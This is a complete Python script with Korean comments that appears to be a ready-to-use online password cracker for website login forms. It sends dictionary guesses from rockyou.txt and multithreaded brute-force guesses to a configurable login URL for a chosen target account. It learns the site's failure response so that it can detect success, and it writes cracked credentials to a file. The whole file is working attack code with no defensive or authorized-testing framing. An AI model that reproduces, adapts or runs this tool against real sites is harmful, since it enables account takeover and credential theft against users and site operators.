
import requests
import threading
import itertools
import random
import string
from concurrent.futures import ThreadPoolExecutor, as_completed
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry
 
# ─────────────────────────────────────────────────────────────
#  대상 설정 — 사이트를 바꿀 땐 여기만 수정하면 된다 (코드는 그대로)
# ─────────────────────────────────────────────────────────────
CONFIG = {
    "url": "",                 # 로그인 POST 주소
    "userid": "",              # 크랙할 대상 아이디
    "id_field": "mid",         # 폼에서 아이디를 담는 필드명
    "pw_field": "pwd",         # 폼에서 비밀번호를 담는 필드명
    "extra_data": {            # 그 외 함께 보내야 하는 고정 폼 필드
        "returnUrl": "",
        "refUrl": "",
        "siteId": "13",
    },
    "wordlist": "rockyou.txt",  # 사전 파일
}
 
# 브루트포스 문자셋
CHARS = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()'
 
# 한 스레드가 비번을 찾으면 set() → 나머지 스레드가 보고 멈춘다
found = threading.Event()
 
 
def make_session():
    """재시도(retry) 설정이 붙은 requests 세션 생성.
    각 스레드가 자기 세션을 따로 만들어 써야 한다 (Session은 스레드 안전하지 않음)."""
    s = requests.Session()
    retry = Retry(total=2, connect=2, read=0, backoff_factor=0.3, status_forcelist=[])
    s.mount("http://", HTTPAdapter(max_retries=retry))
    s.mount("https://", HTTPAdapter(max_retries=retry))
    return s
 
 
def build_data(cfg, pw):
    """CONFIG를 바탕으로 이번 요청에 보낼 폼 데이터를 만든다.
    고정 필드(extra_data) + 아이디 + 비번을 합친다."""
    data = dict(cfg["extra_data"])   # 고정 필드 복사
    data[cfg["id_field"]] = cfg["userid"]
    data[cfg["pw_field"]] = pw
    return data
 
 
def random_password(length=12):
    """기준값 수집용 무작위(=거의 확실히 틀린) 비번."""
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))
 
 
def collect_baseline(cfg, samples=10):
    """틀린 비번 여러 개를 보내 '실패했을 때의 응답'을 학습한다.
    각 축(status/body/location)이 매번 같으면 기준값으로 삼고,
    매번 다르면 None(불안정 → 판정에서 제외)으로 둔다.
    반환: (base_code, base_body, base_location)"""
    s = make_session()
    codes, bodies, locations = [], [], []
    for _ in range(samples):
        data = build_data(cfg, random_password())
        try:
            r = s.post(cfg["url"], data=data, allow_redirects=False, timeout=(3, 10))
        except Exception as e:
            print(f"[!] 기준값 수집 중 오류: {e}")
            continue
        codes.append(r.status_code)
        bodies.append(r.text.strip())
        locations.append(r.headers.get("Location", ""))
        r.close()
    s.close()
 
    def stable(values):
        # 수집한 값이 모두 같으면 그 값을, 하나라도 다르면 None
        return values[0] if values and all(v == values[0] for v in values) else None
 
    return stable(codes), stable(bodies), stable(locations)
 
 
def is_success(response, baseline):
    """이번 응답이 '실패 기준'과 다르면 성공으로 본다.
    기준이 None인 축(불안정)은 판정에서 제외한다."""
    base_code, base_body, base_location = baseline
    if base_code is not None and response.status_code != base_code:
        return True
    if base_body is not None and response.text.strip() != base_body:
        return True
    if base_location is not None and response.headers.get("Location", "") != base_location:
        return True
    return False
 
 
def save_success(cfg, userPW):
    """크랙 성공 시 결과 저장 + 전체 중단 신호."""
    print(f"{cfg['userid']}ID 크랙 성공 PW: {userPW}")
    with open("S_ID_PASSWORD.txt", "a", encoding="utf-8") as file:
        file.write("ID :" + str(cfg["userid"]) + "\n")
        file.write("PASSWORD :" + str(userPW) + "\n")
    found.set()
 
 
def dictionary_admission(cfg, baseline):
    """사전공격: 사전 파일의 비번을 한 줄씩 대입."""
    print("start!")
    s = make_session()
    # errors="ignore": rockyou 등엔 깨진 바이트가 섞여 있어 못 읽는 줄은 건너뜀
    with open(cfg["wordlist"], "r", encoding="utf-8", errors="ignore") as f:
        for password in f:
            if found.is_set():
                return
            userPW = password.strip()
            data = build_data(cfg, userPW)
            try:
                response = s.post(cfg["url"], data=data, allow_redirects=False, timeout=(3, 10))
            except Exception as error:
                with open("error.txt", "a", encoding="utf-8") as file_1:
                    file_1.write(f"dictionary_admission: {str(error)}\n")
                continue
 
            print(f"{userPW} 시도중...")
            if is_success(response, baseline):
                save_success(cfg, userPW)
                return
            response.close()
    s.close()
 
 
def bruteforce(cfg, baseline, chars, start_value, end_value):
    """무차별 대입: start_value~end_value 길이의 모든 조합을 대입.
    온라인 공격은 요청마다 네트워크 왕복이 있어 짧은 길이만 현실적이다."""
    s = make_session()
    for length in range(start_value, end_value):
        for combo in itertools.product(chars, repeat=length):
            if found.is_set():
                return
            userPW = ''.join(combo)
            data = build_data(cfg, userPW)
            try:
                response = s.post(cfg["url"], data=data, allow_redirects=False, timeout=(3, 10))
            except Exception as error:
                with open("error.txt", "a", encoding="utf-8") as file_1:
                    file_1.write(f"bruteforce: {str(error)}\n")
                continue
 
            print(f"BruteForce {userPW} 시도중...")
            if is_success(response, baseline):
                save_success(cfg, userPW)
                return
            response.close()
    s.close()
 
 
if __name__ == "__main__":
    found.clear()
 
    # 1) 실패 응답을 학습해 성공 판정 기준을 만든다 (사이트마다 자동)
    print("[*] 기준값(실패 응답) 수집 중...")
    baseline = collect_baseline(CONFIG)
    print(f"[*] 기준값 → code={baseline[0]!r}, "
          f"body={'있음' if baseline[1] is not None else 'None'}, "
          f"location={baseline[2]!r}")
 
    if all(b is None for b in baseline):
        print("[!] 성공/실패를 구분할 신호가 없음. 이 타겟은 판정 불가.")
    else:
        # 2) web은 I/O 바운드(서버 응답 대기)라 스레드가 유효 — GIL이 대기 중 풀림
        #    사전공격 1개 + 브루트포스 3구간(길이 1~2 / 3 / 4)을 분담
        with ThreadPoolExecutor(max_workers=4) as executor:
            futures = [
                executor.submit(dictionary_admission, CONFIG, baseline),
                executor.submit(bruteforce, CONFIG, baseline, CHARS, 1, 3),
                executor.submit(bruteforce, CONFIG, baseline, CHARS, 3, 4),
                executor.submit(bruteforce, CONFIG, baseline, CHARS, 4, 5),
            ]
            for fut in as_completed(futures):
                try:
                    fut.result()
                except Exception as es_1:
                    print("[메인] 워커 예외:", type(es_1).__name__, es_1)
 
        if not found.is_set():
            print(f"{CONFIG['userid']} 해당 아이디에 패스워드 존재하지 않음")
